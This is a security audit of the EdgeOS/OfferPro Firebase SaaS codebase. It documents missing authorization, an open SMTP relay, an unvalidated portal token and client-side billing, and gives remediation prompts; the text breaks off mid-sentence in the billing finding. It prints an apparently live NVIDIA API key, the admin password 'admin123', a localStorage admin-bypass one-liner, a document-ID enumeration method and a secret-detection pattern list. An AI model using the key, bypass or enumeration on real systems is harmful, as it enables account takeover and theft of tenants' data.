# EdgeOS (OfferPro) — Mega Audit

**Repository:** `nikhilsrinath/offerpro`
**Audit date:** 2026-09-06
**Codebase:** ~47,100 LOC · 111 files · React 19 + Vite 7 + Firebase (RTDB + Firestore)
**Build status:** ✅ compiles (24.4s) · **Lint:** ❌ 86 errors, 13 warnings · **Tests:** ❌ none exist

---

## Executive Summary

| | |
|---|---|
| **Overall SaaS Health Score** | **2.8 / 10** |
| **Production readiness** | **NOT SAFE TO OPERATE COMMERCIALLY** |
| **Critical issues** | 9 |
| **High issues** | 14 |
| **Medium issues** | 16 |
| **Low issues** | 9 |
| **Estimated effort to production-grade** | 10–14 engineer-weeks |

EdgeOS is a genuinely ambitious product. The feature surface is large and coherent — offer letters, certificates, NDAs, MoUs, invoices, quotations, proforma invoices, recurring billing, CRM, employee registry, org chart, task board, bulk operations, a recipient e-signature portal, and an AI co-founder. The UI has real craft: a considered design system, dark/light theming, and a landing page that looks like a funded startup's.

**But the product is a well-dressed prototype, not a SaaS.** The gap is not polish — it is foundations. Specifically:

1. **There is no server-side authorization anywhere in the system.** Multi-tenancy is enforced only by client-side query filters (`where('orgId','==',_orgId)`). No Firestore or RTDB security rules exist in the repository at all.
2. **The admin panel — which can permanently delete any organization and all its records — is protected by a hardcoded client-side password, `admin123`, stored in `localStorage`.**
3. **A live NVIDIA API key is committed to git** in a tracked `.env` file, and `/api/nvidia` is an unauthenticated, `Access-Control-Allow-Origin: *` proxy to it.
4. **`/api/email` is an open SMTP relay** that accepts arbitrary Gmail credentials and arbitrary recipients from any caller on the internet.
5. **Customer Gmail App Passwords are stored in plaintext** in the org profile — in Firestore, in RTDB, and in `localStorage`.
6. **The recipient portal generates a security token and never validates it.** Document IDs are sequential (`INV-2026-0001`), so any customer's invoice or offer letter can be enumerated, read, and legally signed by a stranger.
7. **Billing is entirely client-side.** `plan: 'max'` is a field the browser can write. There is no payment provider in the codebase.
8. **Zero tests, zero CI, zero error boundaries, zero observability.**
9. **The main JS bundle is 3.38 MB (976 KB gzipped) in a single chunk**, shipped to every anonymous visitor of the marketing landing page.

Each of these is independently sufficient to block a commercial launch. Together they mean the application currently cannot safely hold a single real customer's data.

**The good news:** the product logic and the UI — the expensive, creative, hard-to-outsource parts — are largely sound. Almost every critical finding lives in a thin, replaceable layer: security rules, one API directory, one data-access module, and build configuration. This is roughly 10–14 weeks of disciplined work, not a rewrite.

---

## Category Scorecard

| # | Area | Score | Verdict |
|---|---|---|---|
| 1 | Core Architecture | **3/10** | Three competing sources of truth; module-global singleton state |
| 2 | Application Stability | **4/10** | No error boundaries; one confirmed crash bug; 86 lint errors |
| 3 | **Security** | **1/10** | **No authz layer. Open relay. Committed secrets. Hardcoded admin password.** |
| 4 | Database & Data Integrity | **2/10** | No rules, no transactions, collision-prone IDs, no schema/validation |
| 5 | Performance & Bundle | **2/10** | 3.38 MB single chunk; 260 KB CSS; full org read on every load |
| 6 | Features & Business Logic | **6/10** | Broad and thoughtful, but limits/quotas unenforced |
| 7 | UI/UX | **7/10** | Genuine strength — the best part of the product |
| 8 | SEO Readiness | **1/10** | No meta description, OG tags, robots.txt, sitemap, or SSR |
| 9 | Code Quality & Maintainability | **3/10** | 13.3k-line CSS file; 2,169 inline styles; TS without a tsconfig |
| 10 | Infrastructure & Deployment | **2/10** | Two conflicting deploy targets; no security headers; no IaC |
| 11 | Testing & Observability | **0/10** | Nothing exists |
| 12 | Browser/Device Compatibility | **5/10** | Responsive CSS present but zoom disabled; no cross-browser testing |
| 13 | Reliability | **3/10** | Silent `.catch(() => {})` swallowing; no retries; no idempotency |
| 14 | Backup & Disaster Recovery | **1/10** | No backups, no export, no migrations, destructive admin delete |
| 15 | SaaS / Product Readiness | **2/10** | No payments, no roles, no audit log, no onboarding gate |

**Weighted overall: 2.8 / 10**

### Severity Distribution

```
CRITICAL  ████████████                    9
HIGH      ███████████████████            14
MEDIUM    ██████████████████████         16
LOW       ████████████                    9
                                    Total 48
```

---

# PART I — CRITICAL FINDINGS

---

## C-1 · No server-side authorization: complete cross-tenant data exposure

**Severity:** CRITICAL · **Difficulty:** High (2 weeks) · **Root cause:** Architectural

### Evidence

There are **no security rules files anywhere in the repository**:

```
$ find . -name "firestore.rules" -o -name "database.rules.json" -o -name "firebase.json"
(no results)
```

Tenant isolation is attempted purely in the client, in `src/services/orgStore.js:193`:

```js
const keyedPromises = Array.from(KEYED_SECTIONS).map(section =>
  getDocs(query(collection(firestore, section), where('orgId', '==', _orgId)))
);
```

The Firestore schema is **flat and global**. `KEYED_SECTIONS` (`orgStore.js:15-18`) writes to top-level collections shared by every tenant:

```js
const KEYED_SECTIONS = new Set([
  'employees', 'ex_employees', 'departments', 'customers',
  'expenses', 'records', 'fin_docs', 'products', 'crm_leads', 'tasks',
]);
```

So every organization's employees, salaries, customers, invoices, expenses and CRM leads sit in the same collections, separated only by a field that the client chooses to filter on.

Worse, the app **requires permissive rules to function**. `RecipientPortal.jsx:99-103` signs recipients in anonymously specifically to satisfy rules:

```js
// Sign in anonymously so Firebase security rules (auth != null) are satisfied
if (!auth.currentUser) {
  await signInAnonymously(auth);
}
```

That comment states the deployed rule shape: `auth != null`. Anonymous sign-in is enabled and unauthenticated. **Therefore any person on the internet can call `signInAnonymously()` and then read and write every document in every collection for every tenant** — employee salaries, bank account numbers, GSTINs, customer lists, invoices, and the plaintext Gmail App Passwords stored in `organizations/{orgId}`.

### Impact

Total, trivially reachable breach of every customer's confidential business and personal data, plus unrestricted write/delete. Under GDPR this is a reportable personal-data breach; under India's DPDP Act it carries penalties up to ₹250 crore. This single issue makes the product unlaunchable.

### AI implementation prompt

```
Implement server-side multi-tenant authorization for the EdgeOS Firebase backend.
There is currently NO authorization layer: tenant isolation exists only as a
client-side `where('orgId','==',orgId)` filter in src/services/orgStore.js, and the
app relies on anonymous auth passing an `auth != null` rule.

INSPECT FIRST
- src/services/orgStore.js — KEYED_SECTIONS (line 15), METADATA_SECTIONS (line 21),
  PROFILE_FIELDS (line 26), and every read/write path (load, addItem, setItem,
  updateItem, removeItem, setSection, listenSection).
- src/context/OrgContext.jsx — how memberships are created (createOrganization) and
  read (fetchOrganizationIds).
- src/services/dualWriteService.js — the onboarding write, which creates the
  `memberships/{id}` doc with {organization_id, user_id, role}.
- src/components/portal/RecipientPortal.jsx — the anonymous-auth read path for
  fin_docs and organizations.

CREATE
1. `firebase.json`, `.firebaserc`, `firestore.rules`, `firestore.indexes.json`,
   `database.rules.json` at the repo root so all rules are version-controlled.
2. In firestore.rules, define:
     function isSignedIn() { return request.auth != null && request.auth.token.firebase.sign_in_provider != 'anonymous'; }
     function isMember(orgId) { return exists(/databases/$(database)/documents/memberships/$(request.auth.uid + '_' + orgId)); }
     function memberRole(orgId) { return get(/databases/$(database)/documents/memberships/$(request.auth.uid + '_' + orgId)).data.role; }
   IMPORTANT: change membership doc IDs from Firebase push IDs to the deterministic
   composite `{uid}_{orgId}` so rules can look them up in O(1) without a query.
   Update dualWriteService.js and OrgContext.createOrganization to write that ID,
   and write a one-off migration script under scripts/ that backfills existing
   membership docs to the new ID scheme (keep the old docs until verified).
3. For every collection in KEYED_SECTIONS: allow read/write only if
   isSignedIn() && isMember(resource.data.orgId), and on create require
   isMember(request.resource.data.orgId). Explicitly deny any write that changes
   `orgId` on an existing document.
4. For `organizations/{orgId}` and `org_metadata/{orgId}`: read requires
   isMember(orgId); write requires memberRole(orgId) in ['owner','admin'].
5. Default-deny everything else: `match /{document=**} { allow read, write: if false; }`
6. Mirror the same model in database.rules.json for the RTDB paths
   `organizations/$orgId`, `memberships/$id`, `users/$uid`.

EDGE CASES YOU MUST HANDLE
- The recipient portal (C-4) must keep working for unauthenticated recipients. Do
  NOT solve this by allowing anonymous reads. Instead the portal must move to a
  signed, expiring token validated by a serverless function (see the C-4 prompt) —
  coordinate with that change and, until it lands, gate portal reads behind a
  short-lived custom claim minted by a Cloud Function.
- orgStore.load() fans out to 10 collections in parallel; each now needs a
  composite index on (orgId). Generate firestore.indexes.json accordingly.
- The `_profile` healing path (orgStore.js:226-275) reads RTDB directly; make sure
  the RTDB rules permit it for members only.
- Users who belong to multiple orgs must not be able to read org B while org A is
  active — rules key off the document's own orgId, so this is handled, but verify.

MUST NOT BREAK
- Existing users must retain access to their existing orgs after the membership-ID
  migration. Run the backfill BEFORE deploying rules, and verify with a read test.
- The onboarding flow in Registration.jsx must still complete end to end.

VERIFY
- Add `npm run test:rules` using @firebase/rules-unit-testing. Write tests proving:
  a member of org A CANNOT read employees/customers/fin_docs/records of org B;
  an anonymous user CANNOT read anything; a non-owner CANNOT write
  organizations/{orgId}; a member CAN do all normal CRUD in their own org.
- Deploy to a staging project and manually confirm the app still functions.
```

---

## C-2 · Admin panel: hardcoded `admin123`, client-side auth, destructive powers

**Severity:** CRITICAL · **Difficulty:** Medium (3 days) · **Root cause:** No server-side admin identity

### Evidence

`admin/index.html` is a 52 KB standalone page, built as a separate Vite entry point (`vite.config.js:84-89`) and deployed at `/admin`.

Its entire authentication is (`admin/index.html:488-493`):

```js
const loginPass = document.getElementById('password').value;
const storedPass = localStorage.getItem('admin_password') || 'admin123';
if (loginPass === storedPass) {
    localStorage.setItem('admin_session', 'true');
```

And the session gate (`admin/index.html:394`):

```js
onAuthStateChanged(auth, (user) => {
    if (localStorage.getItem('admin_session') === 'true') {
```

**Any visitor can open DevTools, run `localStorage.setItem('admin_session','true')`, reload, and become a full administrator.** No password is even required.

That administrator can permanently destroy tenants (`admin/index.html:515`):

```js
const confirmName = prompt("WARNING: This will permanently delete this organization and ALL its records including invoices, MOUs, and offer letters. To confirm, type 'DELETE THIS ACCOUNT':");
```

The panel authenticates to Firebase with `signInAnonymously(auth)` (`admin/index.html:391`), confirming that anonymous users have broad read/write access across all tenants.

Compounding this, `scripts/setup-admin.js:11-12` provisions a **real Firebase Auth account** with a published credential:

```js
const ADMIN_EMAIL = 'admin@edgeos.com';
const ADMIN_PASSWORD = 'admin123';
```

### Impact

Complete platform takeover and irreversible destruction of all customer data by any anonymous visitor. There are no backups (see C-9), so deletion is permanent.

### AI implementation prompt

```
Replace the insecure EdgeOS admin panel authentication with real server-verified
admin identity, and make destructive operations safe and auditable.

INSPECT FIRST
- admin/index.html in full. Note: auth at lines 488-493 and 885-923 (localStorage
  password, default 'admin123'), session gate at line 394, anonymous Firebase
  sign-in at line 391, and the org-delete flow at line 515.
- scripts/setup-admin.js — hardcoded admin@edgeos.com / admin123.
- vite.config.js lines 18-28 (the /admin dev middleware) and 83-90 (the admin
  rollup entry point).

IMPLEMENT
1. Delete ALL client-side password logic from admin/index.html: the
   `admin_password` and `admin_session` localStorage keys, the login comparison,
   and the change-password modal. Remove signInAnonymously entirely.
2. Authenticate admins with Firebase Auth email/password sign-in, then gate on a
   custom claim `admin: true` read from the ID token
   (`(await user.getIdTokenResult()).claims.admin === true`). If the claim is
   absent, sign the user out and show "Not authorized" — never render admin UI.
3. Rewrite scripts/setup-admin.js to (a) take email and password from
   process.argv/env rather than constants, (b) refuse to run if the password is
   shorter than 16 chars, and (c) call
   `auth.setCustomUserClaims(uid, { admin: true })`. Never commit a credential.
4. Move every destructive and cross-tenant admin operation out of the browser into
   a serverless function under api/admin/ that verifies the caller's ID token with
   firebase-admin `verifyIdToken()` AND re-checks the `admin` claim server-side.
   The browser must never hold privileges the rules don't grant it.
5. Make org deletion a soft delete: set `deleted_at` and `deleted_by`, exclude
   soft-deleted orgs from all app queries, and add a 30-day purge job. Write an
   entry to a new append-only `audit_log` collection for every admin action
   (actor uid, action, target orgId, timestamp, IP).
6. In firestore.rules (from C-1), allow admin-claim reads across tenants but route
   all admin WRITES exclusively through the serverless functions.

EDGE CASES
- The admin panel currently reads all orgs by listing collections; after C-1 rules
  land, those reads must be authorized by the admin claim — verify both changes
  work together, and deploy C-1 rules and this change in the same release.
- Handle expired/revoked tokens: force re-auth rather than falling through to a
  rendered panel.
- The panel is a separate Vite entry; confirm `npm run build` still emits
  dist/admin/index.html.

MUST NOT BREAK
- The main application at / must be entirely unaffected.
- Existing (legitimate) admin workflows — viewing orgs, viewing records — should
  continue to work once the claim is set on the real admin account.

VERIFY
- Confirm that setting localStorage.admin_session='true' in DevTools no longer
  grants any access.
- Confirm a signed-in NON-admin user is rejected.
- Confirm org deletion writes an audit_log entry and is reversible within 30 days.
- Grep the built dist/ output to prove the string 'admin123' is gone.
```

---

## C-3 · Live API key committed to git; `.env` is tracked and `.gitignore` omits it

**Severity:** CRITICAL · **Difficulty:** Low to rotate, Medium to purge history (1 day) · **Root cause:** Missing gitignore entry

### Evidence

`.env` is tracked in version control:

```
$ git ls-files | grep -E "^\.env"
.env
.env.example
```

`.gitignore` contains `*.local` but **no `.env` entry**. The tracked file contains a live credential:

```
VITE_NVIDIA_API_KEY=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
```

It is present across multiple commits in history (`cd8b4f0`, `f2ebe2d`).

Two separate problems compound it:

1. The `VITE_` prefix means Vite **inlines this value into the client bundle** for anyone who builds with this `.env`. It is designed to be public.
2. `vite.config.js:9` reads it and injects it as a proxy `Authorization` header, so the dev server also leaks it.

Additionally `nohup.out` is committed, leaking an internal network address (`http://192.168.29.229:5173/`), and `.gitignore` does not cover `service-account.json` — which `scripts/setup-admin.js:5` expects to read, and which would be a full Firebase admin credential.

### Impact

Unbounded third-party inference billing on a stolen key; the key must be treated as compromised permanently. Risk of a future service-account commit that grants total Firebase control.

### AI implementation prompt

```
Remove committed secrets from the EdgeOS repository and prevent recurrence.

INSPECT FIRST
- .gitignore (no .env entry), .env (tracked, contains a live NVIDIA key),
  .env.example, nohup.out (committed, leaks a LAN IP),
  scripts/setup-admin.js line 5 (reads ./service-account.json),
  vite.config.js lines 8-9 (reads VITE_NVIDIA_API_KEY / NVIDIA_API_KEY).

IMPLEMENT
1. FIRST, out of band: the user must revoke and reissue the NVIDIA key at
   build.nvidia.com. Treat the existing key as permanently burned — purging git
   history does not un-leak it. State this clearly in your summary.
2. Add to .gitignore: `.env`, `.env.*`, `!.env.example`, `service-account.json`,
   `*.pem`, `*.key`, `nohup.out`, `dist/`.
3. `git rm --cached .env nohup.out` and commit the removal.
4. Purge both files from history with git-filter-repo (preferred) or BFG. Because
   this rewrites history, DO NOT run the force-push yourself — prepare the command,
   explain that every collaborator must re-clone, and ask the user to confirm
   before any push.
5. Rename the variable from VITE_NVIDIA_API_KEY to NVIDIA_API_KEY everywhere so it
   can never be inlined into the client bundle. Update vite.config.js line 9 to
   read only `env.NVIDIA_API_KEY`. Update .env.example to match and remove the
   misleading VITE_FIREBASE_* placeholders that are not actually used (the real
   config is hardcoded in src/lib/firebase.js).
6. Add a pre-commit hook (husky + gitleaks, or a small Node script) that blocks
   commits containing `nvapi-`, `AIza`, `-----BEGIN`, or a tracked .env.
7. Add a GitHub Actions job running gitleaks on every PR.

EDGE CASES
- The Vite dev proxy at vite.config.js:71-80 injects the key server-side in the dev
  process only; that is acceptable and must keep working after the rename.
- Firebase web config in src/lib/firebase.js is NOT a secret and does not need to
  move — but note in your summary that it is only safe once C-1 security rules
  exist.

MUST NOT BREAK
- `npm run dev` must still reach NVIDIA locally with a valid key in .env.
- `npm run build` must succeed.

VERIFY
- `git ls-files | grep .env` returns only .env.example.
- `git log --all -p -- .env | grep nvapi-` returns nothing after the purge.
- `npm run build && grep -r "nvapi-" dist/` returns nothing.
```

---

## C-4 · Recipient portal: token generated but never validated (IDOR on legal documents)

**Severity:** CRITICAL · **Difficulty:** Medium (4 days) · **Root cause:** Security theater

### Evidence

`src/components/shared/PortalLinkGenerator.jsx:11-13` mints a token:

```js
const token = Math.random().toString(36).substring(2, 10);
const orgId = activeOrg?.id || '';
const portalUrl = `${window.location.origin}/portal/${documentId}?token=${token}&org=${orgId}`;
```

Three defects in three lines:

1. `Math.random()` is not cryptographically secure, and only 8 chars.
2. The token is **regenerated on every React render** (ESLint flags this as `react-hooks/purity`), so a copied link's token is arbitrary and meaningless.
3. **The token is never stored and never checked.** Grepping `RecipientPortal.jsx` for `token` returns only a code comment. The component reads `documentId` and `org` from the URL and fetches the document unconditionally (`RecipientPortal.jsx:113-128`).

The UI even advertises the weakness (`PortalLinkGenerator.jsx:52`): *"Link does not expire"*.

Document IDs are **sequentially generated** (`documentStore.js:98-103`):

```js
nextId: (prefix) => {
  const all = documentStore.getAll();
  const matching = all.filter(d => d.id && d.id.startsWith(prefix));
  const num = matching.length + 1;
  return `${prefix}-2026-${String(num).padStart(4, '0')}`;
}
```

So valid URLs are `/portal/INV-2026-0001?org=<orgId>` … `0002`, `0003`. Anyone with one org ID can walk the entire document set.

The portal is not read-only. It **captures legally binding e-signatures** and writes back via `documentStore.updateStatus` (`documentStore.js:72-92`), including accepting quotations and confirming payments.

### Impact

Any third party can enumerate, read, download and **legally sign or accept** another company's offer letters, NDAs, MoUs, invoices and quotations. This is both a confidentiality breach and a contract-integrity failure that would void the e-signatures the product exists to produce.

### AI implementation prompt

```
Secure the EdgeOS recipient portal with real, verifiable, expiring access tokens.
Today the token is decorative: PortalLinkGenerator.jsx:11 generates it with
Math.random() on every render, and RecipientPortal.jsx never validates it.
Document IDs are sequential (documentStore.js:98-103), so the portal is a
straightforward IDOR over legally binding documents.

INSPECT FIRST
- src/components/shared/PortalLinkGenerator.jsx (whole file, 57 lines).
- src/components/portal/RecipientPortal.jsx lines 66-205 (load path) and every
  call to documentStore.updateStatus (the signature/accept/decline writes).
- src/services/documentStore.js — setContext, init, getById, save, updateStatus,
  nextId.
- src/App.jsx lines 601-608 and 616 — the /portal/:documentId route.

IMPLEMENT
1. Create `api/portal/issue-token.js` (serverless): verifies the caller's Firebase
   ID token, confirms membership of the document's org, then signs a JWT with
   claims { documentId, orgId, recipientEmail, scope: 'sign'|'view',
   exp: now + 14 days, jti }. Sign with a PORTAL_TOKEN_SECRET env var (never a
   VITE_ variable). Persist the jti in a `portal_tokens` collection with
   {documentId, orgId, issued_by, issued_at, expires_at, revoked: false,
   used_at: null}.
2. Create `api/portal/document.js`: accepts the JWT, verifies signature +
   expiry + jti not revoked, and only then returns the document and the subset of
   org profile fields the portal renders (company name, logo, address, authorized
   signatory). It must NEVER return gmail_app_password, bank_account_number, or
   any other PROFILE_FIELDS secret — build an explicit allowlist.
3. Create `api/portal/sign.js`: same verification, plus scope==='sign', plus a
   check that the document is not already signed. Write the signature server-side.
   Record IP and user-agent on the signature record for evidentiary value.
4. Rewrite PortalLinkGenerator to call issue-token and render the returned URL.
   Remove the Math.random() token. Move the call into an event handler or
   useEffect so it does not run during render. Show the real expiry date instead
   of "Link does not expire", and add a "Revoke link" button.
5. Rewrite RecipientPortal to read the JWT from the URL and fetch exclusively
   through the new endpoints. Remove signInAnonymously (line 101-103), remove the
   direct getDoc/get(ref(db,...)) calls (lines 120-155), and remove
   documentStore.setContext/_portalOrgId entirely.
6. Replace sequential IDs: change documentStore.nextId to produce a
   collision-resistant ID (crypto.randomUUID(), or a ULID) while keeping a
   separate human-readable display number that is generated server-side by an
   atomic Firestore counter transaction so it cannot duplicate. See D-2.

EDGE CASES YOU MUST HANDLE
- Expired token → friendly "This link has expired, please request a new one" page,
  not a crash or a blank screen.
- Already-signed document → show the signed state read-only; never allow a second
  signature to overwrite the first.
- Revoked token → same treatment as expired.
- Clock skew: allow 60s leeway on exp.
- A recipient opening the link on a second device must still work (the token is
  the credential; do not bind to a device).
- Rate-limit issue-token and sign per IP to stop brute-forcing jti values.

MUST NOT BREAK
- The existing PDF rendering and download in the portal (RecipientPortal.jsx
  lines 343-360) must still work with the server-fetched document shape.
- The offer-acceptance notification flow that writes to fin_notifs and drives
  OfferTracker must still fire.

VERIFY
- Prove that GET /portal/INV-2026-0002 with no token, a random token, an expired
  token, or a token minted for a DIFFERENT document all fail closed.
- Prove a valid token still allows view + sign exactly once.
- Add integration tests for each of those six cases.
```

---

## C-5 · `/api/email` is an unauthenticated open SMTP relay

**Severity:** CRITICAL · **Difficulty:** Medium (3 days) · **Root cause:** Credentials passed from client

### Evidence

`api/email.js:8-35` — the entire handler, with no authentication of any kind:

```js
export default async function handler(req, res) {
  if (req.method !== 'POST') { ... }
  const { gmailUser, appPassword, to, subject, text, html, fromName } = req.body || {};
  ...
  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com', port: 465, secure: true,
    auth: { user: gmailUser, pass: cleanPass },
  });
```

There is no Firebase ID-token check, no origin check, no rate limit, and no recipient validation. `to` is passed straight through and even accepts arrays (`api/email.js:54`).

The credentials arrive **from the browser** (`src/services/emailService.js:23`):

```js
body: JSON.stringify({ gmailUser, appPassword, to, subject, text, html, fromName }),
```

read out of the org profile (`emailService.js:46-49`):

```js
gmailUser:   (orgProfile?.gmail_user || '').trim(),
appPassword: (orgProfile?.gmail_app_password || '').trim(),
```

And `gmail_app_password` is a first-class stored profile field (`orgStore.js:36`), meaning it is persisted **in plaintext** to Firestore `organizations/{orgId}`, to RTDB, and to `localStorage` via `persistToLS()` (`orgStore.js:60-67`).

`transporter.verify()` at line 39 also turns the endpoint into a **free Gmail credential-validation oracle**: it returns HTTP 401 with `EAUTH` for bad credentials and 200 for good ones.

### Impact

Three distinct critical outcomes:
1. **Open relay** — anyone can send mail through your infrastructure, with your domain in the request path, using any credentials they hold. Rapid IP/domain blacklisting.
2. **Credential-stuffing oracle** — attackers can validate stolen Gmail App Passwords at scale against your endpoint.
3. **Customer email account takeover** — a Gmail App Password grants full SMTP/IMAP access to the customer's mailbox. These are stored in plaintext in a database with no security rules (C-1) and readable by an anonymous user.

### AI implementation prompt

```
Secure EdgeOS outbound email. api/email.js is currently an unauthenticated open
SMTP relay that accepts arbitrary Gmail credentials and recipients from any caller,
and doubles as a credential-validation oracle via transporter.verify().

INSPECT FIRST
- api/email.js (whole file, 73 lines).
- src/services/emailService.js — send() at line 11, getConfig() at line 46, and
  every public method that calls send().
- src/services/orgStore.js line 36 — gmail_user / gmail_app_password in
  PROFILE_FIELDS, and persistToLS() at line 60 which writes them to localStorage.
- src/components/CompanyProfile.jsx lines 62-63, 93-94, 164-165, 570-612 — the
  credential UI and the test-connection call.
- vite.config.js lines 30-65 — the dev middleware that shims this same handler.

IMPLEMENT
1. Authenticate the endpoint. Require an `Authorization: Bearer <Firebase ID
   token>` header; verify it with firebase-admin `verifyIdToken()`. Resolve the
   caller's orgId from the request and confirm membership via the memberships
   collection. Reject everything else with 401/403.
2. STOP accepting credentials from the client. The handler must load the org's
   SMTP credentials server-side from Firestore using the admin SDK, keyed by the
   verified orgId. Remove gmailUser/appPassword from the request body contract and
   from emailService.js's send() payload.
3. Encrypt credentials at rest. Add api/lib/crypto.js using AES-256-GCM with a key
   from an EMAIL_CRED_KEY env var. Store {ciphertext, iv, tag} in a separate
   `org_secrets/{orgId}` collection that firestore.rules denies to ALL clients
   (server-only). Remove gmail_user and gmail_app_password from PROFILE_FIELDS in
   orgStore.js so they can never again be written to the org profile, RTDB, or
   localStorage. Write a migration script that moves existing values into
   org_secrets and blanks them from organizations/*, and note that any already-
   exposed passwords must be revoked by the customer in their Google account.
4. Rate-limit per org (e.g. 100 emails/hour, 20 test-connections/day) with a
   Firestore or Upstash counter. Return 429 with a clear message.
5. Validate recipients: enforce a strict email regex, cap `to` at 50 addresses,
   and reject header-injection attempts (CR/LF in subject or fromName) — note that
   the installed nodemailer version has a known CRLF header-injection advisory, so
   upgrade it as part of this change.
6. Make the test-connection path (emailService.testConnection) not act as an
   oracle: it may only test the CALLER'S OWN stored credentials, never arbitrary
   ones supplied in the request.
7. Update the vite.config.js dev middleware so local development exercises the
   same auth path rather than bypassing it.

EDGE CASES
- CompanyProfile must still let a user enter and save an App Password — but it
  should POST it to a new authenticated api/email/credentials.js endpoint that
  encrypts and stores it, and the field must render as write-only (show
  "configured ••••" once set, never read the value back to the client).
- Existing orgs with plaintext credentials must keep sending email through the
  migration window — run the migration before flipping the read path.
- All emailService callers (offer letters, follow-ups, notifications, bulk sends)
  must be updated to the new signature; find them all before you change send().

MUST NOT BREAK
- Bulk send flows in src/components/bulk/* must still work, including their
  progress tracking.
- The follow-up engine (src/services/followUpEngine.ts) must still send.

VERIFY
- curl the endpoint with no Authorization header → 401.
- curl with a valid token but an orgId the caller is not a member of → 403.
- Confirm a normal in-app send still succeeds.
- Confirm the response no longer distinguishes valid from invalid third-party
  credentials.
- Grep the client bundle to prove no App Password value ever reaches it.
```

---

## C-6 · `/api/nvidia` is an unauthenticated, wildcard-CORS AI proxy

**Severity:** CRITICAL · **Difficulty:** Low (1 day) · **Root cause:** Missing auth on a metered resource

### Evidence

`api/nvidia.js:8-10`:

```js
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
```

No `Authorization` header is accepted or checked anywhere in the file — grepping the `api/` directory for auth guards returns only the outbound header to NVIDIA. The only validation is `Array.isArray(messages)` (line 33).

The caller fully controls `model`, `messages`, `max_tokens`, `temperature`, `top_p` and `stream` (line 30). `max_tokens` is unbounded.

Meanwhile the quota that is supposed to govern AI usage is never enforced. `ai_message_count` is **read** in `usePlanStatus.js:48,109` and initialized to `0` in `dualWriteService.js:53` — but grepping the entire `src/` tree shows **it is never incremented anywhere**. `PLANS.free.limits.aiMessages = 10` (`planConfig.js:18`) is therefore decorative.

### Impact

A free, unlimited, globally accessible LLM endpoint billed to the project owner. `ACAO: *` means it can be embedded in any third-party site. Costs are unbounded and there is no circuit breaker. Separately, paying customers get no more AI than free ones, so the pricing tiers are fictional.

### AI implementation prompt

```
Secure and meter the EdgeOS AI proxy. api/nvidia.js is currently an
unauthenticated LLM endpoint with Access-Control-Allow-Origin:* and no rate
limiting, and the ai_message_count quota it is supposed to respect is never
incremented anywhere in the codebase.

INSPECT FIRST
- api/nvidia.js (whole file, 89 lines) — note ACAO:* at line 8, absent auth,
  caller-controlled model/max_tokens at line 30.
- src/services/cofounderAI.ts line 11 (NVIDIA_API_URL) and the fetch at line 412.
- src/services/companyMemory.ts line 665 (orgStore.getCache()) — check exactly what
  org data is placed into the prompt.
- src/hooks/usePlanStatus.js lines 48 and 109 — ai_message_count is read here.
- src/services/planConfig.js lines 18, 36, 54 — the aiMessages limits.
- src/services/dualWriteService.js line 53 — where the counter is initialized.

IMPLEMENT
1. Require `Authorization: Bearer <Firebase ID token>`; verify with firebase-admin
   verifyIdToken(). Reject unauthenticated calls with 401.
2. Replace ACAO:* with an explicit allowlist from an ALLOWED_ORIGINS env var
   (production domain + localhost for dev). Echo back only a matching origin.
3. Server-side quota enforcement: resolve the caller's orgId, read its `plan` and
   `ai_message_count` with the admin SDK, look up the limit from a SHARED plan
   config (extract src/services/planConfig.js into a location importable by both
   client and api/, e.g. shared/planConfig.js, so limits can never drift), and
   return 429 with a structured {error:'quota_exceeded', limit, used} body when the
   limit is reached. Increment the counter with a Firestore
   `FieldValue.increment(1)` transaction AFTER a successful upstream call.
4. Clamp inputs server-side: allowlist permitted `model` values, cap `max_tokens`
   (e.g. 2048), cap total prompt characters, and cap `messages.length`. Reject
   anything outside those bounds with 400.
5. Add per-org and per-IP rate limiting (e.g. 20 req/min).
6. Audit what leaves the building: companyMemory.ts sends organization data to a
   third-party inference provider. Enumerate exactly which fields are included and
   strip anything sensitive — bank_account_number, gmail_app_password, GSTIN,
   employee salaries and personal emails must never be in a prompt. Add an explicit
   allowlist rather than passing orgStore.getCache() wholesale. Then document the
   third-party data flow in the privacy policy page
   (src/components/landing/pages/PrivacyPage.jsx).
7. Update cofounderAI.ts to attach the ID token to its fetch and to surface the
   429 quota state in the UI (CopilotPanel should show "You've used all N messages
   on the Free plan" with an upgrade link, not a generic error).

EDGE CASES
- Streaming responses (stream:true) must keep working; increment the counter after
  the stream completes, and handle a client that disconnects mid-stream without
  double-counting or losing the increment.
- Concurrent requests from the same org must not race past the limit — use a
  transaction, not read-then-write.
- Users on the Max plan have Infinity as their limit; make sure that serializes
  correctly through the shared config (JSON has no Infinity — use null or -1).

MUST NOT BREAK
- The AI co-founder chat, its onboarding prompt flow, and the decision engine must
  continue to function for authenticated users within quota.
- The local dev path via the vite.config.js proxy (lines 71-80) must still work;
  update it if needed so dev exercises the same auth.

VERIFY
- curl with no token → 401. curl from a disallowed Origin → CORS rejection.
- Send 11 messages on a Free-plan org → the 11th returns 429 and the UI shows the
  upgrade prompt.
- Confirm ai_message_count actually increments in Firestore.
- Confirm no sensitive field appears in the outbound prompt payload (log and
  inspect one real request in staging).
```

---

## C-7 · Billing and plan limits are unenforceable; no payment system exists

**Severity:** CRITICAL (business) · **Difficulty:** High (2 weeks) · **Root cause:** Client-authoritative state

### Evidence

The current plan is read from client-held org state (`usePlanStatus.js:19`):

```js
const currentPlan = activeOrg?.plan || DEFAULT_PLAN;
```

`plan` and `is_premium` are ordinary writable profile fields (`orgStore.js:34`), and `orgStore.updateProfile()` (`orgStore.js:333-344`) writes them straight to Firestore and RTDB from the browser:

```js
async updateProfile(updates) {
  ...
  Object.assign(_cache._profile, updates);
  persistToLS();
  update(ref(db, path), sanitize(updates)).catch(() => {});
  syncToFirestore('_profile', _orgId, updates);
}
```

**A user can grant themselves the Max plan from the browser console.** With no security rules (C-1), so can a stranger.

Enforcement is advisory in any case — `canCreate()` (`usePlanStatus.js:78-80`) only gates UI. No server ever re-checks. And usage counting is done by fetching every record and counting in a loop (`usePlanStatus.js:52-62`), which is both slow and trivially desynchronized.

There is **no payment provider anywhere in the codebase** — no Stripe, no Razorpay, no Paddle in `package.json` or `src/`. A `PricingPage.jsx` exists (293 lines) advertising paid tiers with no way to pay.

### Impact

Zero revenue is collectible, and any revenue that were collected would be trivially bypassed. The product cannot function as a SaaS business in its current form.

### AI implementation prompt

```
Make EdgeOS billing real and server-authoritative. Today `plan` is a
